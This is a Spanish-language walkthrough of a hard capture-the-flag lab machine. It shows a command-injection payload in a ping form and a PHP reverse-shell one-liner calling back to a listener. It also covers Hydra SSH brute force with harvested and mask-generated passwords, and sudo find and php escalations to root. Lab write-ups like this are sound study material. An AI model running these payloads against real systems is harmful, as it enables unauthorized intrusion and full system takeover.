**Nota : Primera máquina difícil resuelta sin ayuda de algún writeup :)**

## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Dentro hay una web que cicla comandos en una tipo consola. 

No encuentro nada raro en el código, en los directorios que descubro por fuzzing ni en los archivos que exponen. Después de mucho rato encuentro una palabra rara en un resultado de un comando y la decido probar de varias maneras como (contraseña, usuario o directorio) y funciona como directorio:

```bash
http://172.17.0.2/d05notfound/
```

Hay un archivo llamado d05notfound.php y que al darle click redirige a un dashboard donde no se puede hacer mucho. Hasta abajo hay una consola para insertar una IP y hacerle ping.

Pruebo varios caracteres para concatenar comando y funciona:

```bash
8.8.8.8 | ls -la
```

Logramos extraer info:

```html
</pre><h2>Resultado del Comando:</h2><pre>total 20
drwxr-xr-x 2 root root 4096 Aug 13 14:42 .
drwxr-xr-x 3 root root 4096 Aug 13 14:52 ..
-rw-r--r-- 1 root root 8300 Aug 13 14:40 d05notfound.php
```

Sabiendo esto toca insertar una Reverse Shell.

Primero me pongo a la escucha:

```bash
nc -nlvp 4444
```

Luego la envio desde la consola vulnerable:

```bash
8.8.8.8 | php -r '$sock=fsockopen("172.17.0.1",4444);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

## Escalada www-data → e1i0t

EL directorio para e1i0t no está restringido, dentro hay dos archivos.txt con contraseñas. Me creo un diccionario con todas ellas y ejecuto un Hydra:

```bash
hydra -l e1i0t -P diccionario.txt ssh://172.17.0.2 -t 64
```

Pass : eliotelmejor

## Escalada e1i0t → **an0n1mat0**

```bash
sudo -l
# Info:
(an0n1mat0 : an0n1mat0) NOPASSWD: /bin/find
```

Lo saco con GTFO Bins en corto:

```bash
sudo -u an0n1mat0 find . -exec /bin/sh \; -quit
```

## Escalada an0n1mat0 → root

En su directorio hay una nota que da una pista que revela que hay un archivo oculto, así que busco archivos con find:

```bash
find / -type f -user an0n1mat0 2>/dev/null
```

Encuentro y leo:

```bash
cat /usr/local/bin/passwords_users.txt
# Info:
an0n1mat0:XXyanonymous
```

Nos dice que las doble x son un caracteres que no sabe y que debemos de descubrir. Para eso utilizare una herramienta llamada mp64:

```bash
mp64 ‘?l?lyanonymous’ > diccionario2.txt
#(?l en los caracteres para rellenar)
```

Y le hago un ataque con Hydra:

```bash
hydra -l an0n1mat0 -P diccionario2.txt ssh://172.17.0.2 -t 64
```

Pass : soyanonymous

Con esto podemos listar los permisos de sudo ya que pedía contraseña.

```bash
sudo -l
(ALL : ALL) /bin/php
```

Gracias GTFO Bins again:

```bash
CMD="/bin/bash"
sudo -u root php -r "system('$CMD');"
```

Listo.
